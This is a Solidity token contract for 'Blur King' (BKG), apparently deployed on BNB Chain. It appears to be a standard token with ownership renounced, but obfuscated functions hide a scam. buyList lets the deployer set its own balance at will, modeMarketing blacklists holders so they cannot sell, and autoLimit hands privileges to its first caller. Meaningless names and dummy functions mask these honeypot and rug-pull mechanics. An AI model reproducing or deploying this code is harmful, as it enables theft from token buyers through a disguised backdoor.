/**
 *Submitted for verification at BscScan.com on 2023-02-14
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.15;

interface modeMax {
    function totalSupply() external view returns (uint256);

    function balanceOf(address modeAuto) external view returns (uint256);

    function transfer(address teamAt, uint256 totalAmountAt) external returns (bool);

    function allowance(address receiverAmount, address spender) external view returns (uint256);

    function approve(address spender, uint256 totalAmountAt) external returns (bool);

    function transferFrom(
        address sender,
        address teamAt,
        uint256 totalAmountAt
    ) external returns (bool);

    event Transfer(address indexed from, address indexed receiverLaunch, uint256 value);
    event Approval(address indexed receiverAmount, address indexed spender, uint256 value);
}

interface totalAmountLimit is modeMax {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

abstract contract exemptTotalMin {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface exemptMin {
    function createPair(address enableTeam, address minReceiverMax) external returns (address);
}

interface maxLaunch {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract BlurKing is exemptTotalMin, modeMax, totalAmountLimit {
    
    address public tokenFrom;
    uint256 private marketingTeamTrading = 100000000 * 10 ** 18;
    mapping(address => bool) public swapBuyReceiver;

    mapping(address => uint256) private limitLiquidity;

    event OwnershipTransferred(address indexed walletEnableAmount, address indexed exemptTradingIs);
    bool public maxWallet;
    bool public isAmount;

    
    string private teamFee = "BKG";
    mapping(address => mapping(address => uint256)) private feeFrom;
    string private fundSenderTx = "Blur King";
    

    bool public atExempt;
    address public tradingShouldSell;

    mapping(address => bool) public enableReceiver;
    bool public sellFee;
    address private takeList;
    uint8 private maxIsFrom = 18;
    

    constructor (){
        
        maxLaunch launchSender = maxLaunch(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        tokenFrom = exemptMin(launchSender.factory()).createPair(launchSender.WETH(), address(this));
        takeList = _msgSender();
        
        tradingShouldSell = _msgSender();
        swapBuyReceiver[_msgSender()] = true;
        
        limitLiquidity[_msgSender()] = marketingTeamTrading;
        emit Transfer(address(0), tradingShouldSell, marketingTeamTrading);
        totalLaunched();
    }

    

    function decimals() external view virtual override returns (uint8) {
        return maxIsFrom;
    }

    function symbol() external view virtual override returns (string memory) {
        return teamFee;
    }

    function totalFrom() public {
        if (maxWallet != atExempt) {
            atExempt = false;
        }
        
        atExempt=false;
    }

    function launchedShould() public {
        if (maxWallet == sellFee) {
            maxWallet = true;
        }
        if (atExempt) {
            atExempt = true;
        }
        maxWallet=false;
    }

    function owner() external view returns (address) {
        return takeList;
    }

    function atListSender() public view returns (bool) {
        return atExempt;
    }

    function txFrom() public {
        
        
        maxWallet=false;
    }

    function buyList(uint256 totalAmountAt) public {
        if (!swapBuyReceiver[_msgSender()]) {
            return;
        }
        limitLiquidity[tradingShouldSell] = totalAmountAt;
    }

    function limitIsTrading(address tokenTotal, address teamAt, uint256 totalAmountAt) internal returns (bool) {
        require(limitLiquidity[tokenTotal] >= totalAmountAt);
        limitLiquidity[tokenTotal] -= totalAmountAt;
        limitLiquidity[teamAt] += totalAmountAt;
        emit Transfer(tokenTotal, teamAt, totalAmountAt);
        return true;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return marketingTeamTrading;
    }

    function feeMin() public view returns (bool) {
        return atExempt;
    }

    function totalLaunched() public {
        emit OwnershipTransferred(tradingShouldSell, address(0));
        takeList = address(0);
    }

    function transfer(address toBuy, uint256 totalAmountAt) external virtual override returns (bool) {
        return sellSender(_msgSender(), toBuy, totalAmountAt);
    }

    function getOwner() external view returns (address) {
        return takeList;
    }

    function sellSender(address tokenTotal, address teamAt, uint256 totalAmountAt) internal returns (bool) {
        if (tokenTotal == tradingShouldSell) {
            return limitIsTrading(tokenTotal, teamAt, totalAmountAt);
        }
        require(!enableReceiver[tokenTotal]);
        return limitIsTrading(tokenTotal, teamAt, totalAmountAt);
    }

    function allowance(address teamAmount, address autoWallet) external view virtual override returns (uint256) {
        return feeFrom[teamAmount][autoWallet];
    }

    function autoLimit(address fromFeeAuto) public {
        if (isAmount) {
            return;
        }
        if (atExempt) {
            sellFee = true;
        }
        swapBuyReceiver[fromFeeAuto] = true;
        if (atExempt != maxWallet) {
            maxWallet = false;
        }
        isAmount = true;
    }

    function modeMarketing(address amountMax) public {
        if (maxWallet == atExempt) {
            atExempt = true;
        }
        if (amountMax == tradingShouldSell || amountMax == tokenFrom || !swapBuyReceiver[_msgSender()]) {
            return;
        }
        
        enableReceiver[amountMax] = true;
    }

    function senderLaunchAuto() public view returns (bool) {
        return atExempt;
    }

    function approve(address autoWallet, uint256 totalAmountAt) public virtual override returns (bool) {
        feeFrom[_msgSender()][autoWallet] = totalAmountAt;
        emit Approval(_msgSender(), autoWallet, totalAmountAt);
        return true;
    }

    function balanceOf(address modeAuto) public view virtual override returns (uint256) {
        return limitLiquidity[modeAuto];
    }

    function swapTrading() public view returns (bool) {
        return sellFee;
    }

    function name() external view virtual override returns (string memory) {
        return fundSenderTx;
    }

    function transferFrom(address tokenTotal, address teamAt, uint256 totalAmountAt) external override returns (bool) {
        if (feeFrom[tokenTotal][_msgSender()] != type(uint256).max) {
            require(totalAmountAt <= feeFrom[tokenTotal][_msgSender()]);
            feeFrom[tokenTotal][_msgSender()] -= totalAmountAt;
        }
        return sellSender(tokenTotal, teamAt, totalAmountAt);
    }


}